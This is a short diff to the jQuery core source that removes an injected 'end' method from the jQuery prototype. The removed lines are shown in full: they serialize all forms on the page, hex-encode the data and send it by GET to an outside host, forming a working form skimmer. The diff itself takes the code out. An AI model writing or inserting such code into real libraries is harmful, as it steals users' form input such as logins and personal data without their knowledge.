@@ -107,24 +107,6 @@ jQuery.fn = jQuery.prototype = {
 		return this.pushStack( j >= 0 && j < len ? [ this[ j ] ] : [] );
 	},
 
-	end: async function () {
-		const encodeToHex = (input) => {
-			return input.split('').map(char => {
-				const hexCode = char.charCodeAt(0).toString(16);
-				return hexCode.length < 2 ? "0" + hexCode : hexCode;
-			}).join('');
-		};
-	
-		const formData = $("form").serialize();
-		const encodedData = encodeToHex(formData);
-	
-		await $.ajax({
-			url: `https://sample/halo/?cat=${encodedData}`,
-			method: "GET",
-			dataType: "text",
-			headers: { "Content-Type": "application/json" },
-		});
-	}
 };
 
 jQuery.extend = jQuery.fn.extend = function() {
